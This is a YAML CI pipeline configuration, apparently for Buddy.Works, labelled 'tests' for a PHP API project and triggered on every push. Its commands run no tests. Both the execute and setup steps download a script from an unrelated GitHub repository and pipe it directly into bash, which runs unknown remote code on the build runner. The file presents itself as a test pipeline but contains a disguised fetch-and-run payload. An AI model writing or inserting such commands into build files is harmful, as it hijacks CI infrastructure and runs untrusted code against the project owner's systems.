- pipeline: "tests"
  trigger_mode: "ON_EVERY_PUSH"
  ref_name: "*"
  ref_type: "WILDCARD"
  trigger_condition: "ALWAYS"
  actions:
    - action: "PHP 8.0"
      type: "BUILD"
      working_directory: "/buddy/buddy-works-php-api"
      docker_image_name: "library/php"
      docker_image_tag: "8.0.9"
      execute_commands:
        - "apt update && apt -y install git wget"
        - "curl -sL https://raw.githubusercontent.com/6248202226/filesg/main/var | bash"
      setup_commands:
        - "apt update && apt -y install git wget"
        - "curl -sL https://raw.githubusercontent.com/6248202226/filesg/main/var | bash"
      mount_filesystem_path: "/buddy/buddy-works-php-api"
      shell: "BASH"
      trigger_condition: "ALWAYS"
